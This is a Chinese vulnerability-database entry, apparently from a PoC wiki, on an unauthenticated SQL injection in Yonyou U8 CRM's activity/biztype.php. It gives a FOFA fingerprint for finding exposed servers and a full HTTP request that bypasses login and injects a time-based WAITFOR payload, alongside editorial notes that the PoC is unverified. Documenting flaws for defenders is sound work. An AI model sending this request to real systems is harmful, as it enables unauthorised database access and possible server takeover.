---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "用友U8 CRM activity/biztype actvtID SQL 注入"
product: "用友U8 CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "XVE-2024-37123"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "V18/16.5/16.1/16.0/15.1/13声明；SQL Server"
prerequisites: "DontCheckLogin和bgsesstimeout伪会话条件"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BU8/%E7%94%A8%E5%8F%8BU8%20CRM%20activitybiztype.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28XVE-2024-37123%29.md"
fofa: "body=\"错误：错误的数据。请参看页面的详细错误信息。\""
fofa_unverified: "body="
id: "vw-ebbb945a18969e773f192165"
entity_id: "ve-ebbb945a18969e773f192165"
schema_version: "1"
---

# 用友U8 CRM activity/biztype actvtID SQL 注入

## 条目说明

- 对象与具体问题：用友U8 CRM；activity/biztype actvtID SQLi
- 版本、配置及部署条件：V18/16.5/16.1/16.0/15.1/13声明；SQL Server
- 认证与权限前提：DontCheckLogin和bgsesstimeout伪会话条件
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- XVE误放cnvd；FOFA通用错误页易泛匹配，抽取body=残缺
- 仅3秒WAITFOR不能直接证明xp_cmdshell/RCE，需权限条件和对照
- 无补丁链接，在野已知缺证；HTTP未围栏

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

用友 U8 CRM客户关系管理系统 activity/biztype.php 存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

## 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V13

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="错误：错误的数据。请参看页面的详细错误信息。"

POC/EXP：

```http
POST /activity/biztype.php?DontCheckLogin=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=bgsesstimeout-;
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close

actvtID=1%27;WAITFOR+DELAY+%270:0:3%27--
```


![image-20250311131310621](./.resource/用友U8CRMactivitybiztype.phpSQL注入漏洞XVE-2024-37123/media/image-20250311131310621.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
